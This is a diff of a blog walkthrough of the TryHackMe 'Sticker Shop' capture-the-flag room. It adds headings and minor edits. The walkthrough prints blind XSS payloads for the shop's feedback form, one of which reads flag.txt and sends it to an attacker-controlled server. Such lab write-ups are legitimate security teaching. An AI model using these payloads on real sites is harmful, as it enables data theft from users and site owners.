@@ -1,6 +1,7 @@
 ---
 title: TryHackMe - The Sticker Shop
 author: rene
+date: 2025-02-13 17:25:44 +0100
 description: A simple walkthrough on using ❌ Cross-Site Scripting for this challenge #
 categories: [TryHackMe]
 tags: [web, xss]     # TAG names should always be lowercase
@@ -8,11 +9,15 @@ render_with_liquid: false
 image:
     path: /images/tryhackme_the_sticker_shop/room_image.png
 ---
+## Intro
+
 Can you exploit the sticker shop in order to capture the flag?
 
 [![Tryhackme Room Link](/images/tryhackme_the_sticker_shop/room_card.png){: width="300" height="300" .shadow}](https://tryhackme.com/room/thestickershop){: .center }
 
 Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!
+
+## Nmap
 
 Let’s start by scanning open ports:
 
@@ -30,7 +35,7 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-As the backup http port is open we can visit the website via `10.10.10.243:8080`
+As the backup http port is open we can visit the website via `10.10.10.243:8080`.
 
 Let’s try to visit `10.10.10.243:8080/flag.txt`
 ![Slash Flag.txt](/images/tryhackme_the_sticker_shop/slash-flagtxt.png){: width="600" height="450" .shadow}
@@ -39,24 +44,27 @@ Let’s try to visit `10.10.10.243:8080/flag.txt`
 Let's visit Feedback subpage
 ![Submit Page](/images/tryhackme_the_sticker_shop/form.png){: width="600" height="450" .shadow}
 
+
+## Cross-Site Scripting
+
 Let's try some XSS
 
-Let's host a python server and try to fetch our attacker machine via script
+Let's host a python server and try to fetch our attacker machine via script:
 ```console
 python3 -m http.server 8000
 ```
 
-And Submit our script
+And Submit our script:
 
 ```console
 </textarea><script>fetch('http://10.11.75.122:8000');</script>
 ```
 
-We've got a response meaning we have a Blind XSS vulnerability
+We've got a response meaning we have a Blind XSS vulnerability.
 
 ![Submit Page](/images/tryhackme_the_sticker_shop/xss_to_myself.png){: width="600" height="450" .shadow}
 
-Now we can try to craft a payload which will look like this
+Now we can try to craft a payload which will look like this:
 ```console
 </textarea><script>async function a() {const res1 = await fetch('http://127.0.0.1:8080/flag.txt');const b = await res1.text();const res2 = await fetch('http://10.11.75.122:8000?a=' + b);}a();</script>
 ```
@@ -67,7 +75,9 @@ Now we can try to craft a payload which will look like this
 2. Reads its contents as text.
 3. Sends the stolen content as a query parameter (`a=<OUR_FLAG>`) to `http://10.11.75.122:8000` (Our Attacker Machine).
 
-Which will give us the flag
+## Flag
+
+After starting our python server locally and inserting our payload, we receive the flag.
 
 ![Submit Page](/images/tryhackme_the_sticker_shop/flag.png){: width="600" height="450" .shadow}
 
